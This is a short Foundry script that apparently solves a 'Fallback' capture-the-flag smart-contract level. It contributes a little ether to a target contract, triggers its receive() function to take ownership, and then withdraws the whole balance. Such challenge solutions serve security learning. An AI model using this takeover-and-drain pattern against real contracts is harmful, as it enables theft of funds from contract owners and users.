// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Level1Fb} from "../src/Level1Fb.sol";
import {Script, console} from "forge-std/Script.sol";

contract Level1FbSolv is Script {
    function run() external {
        Level1Fb level1Fb = Level1Fb(payable(0x15980614f97c4d3c93cE0518e28790c4f57C0ad7));

        /* 
    @dev 
      charging our contract vs some eth,
      contributing to target contact,
      sending some eth to run the logic from the receive() function and get the ownership, 
      withdrawing the balance.
        */

        vm.startBroadcast();
        level1Fb.contribute{value: 0.0005 ether}();
        console.log(level1Fb.getContribution());
        (bool success,) = address(level1Fb).call{value: 0.0005 ether}("");
        require(success);
        console.log("New Owner: ", level1Fb.owner());
        level1Fb.withdraw();
        console.log(address(level1Fb).balance);
        vm.stopBroadcast();
    }
}
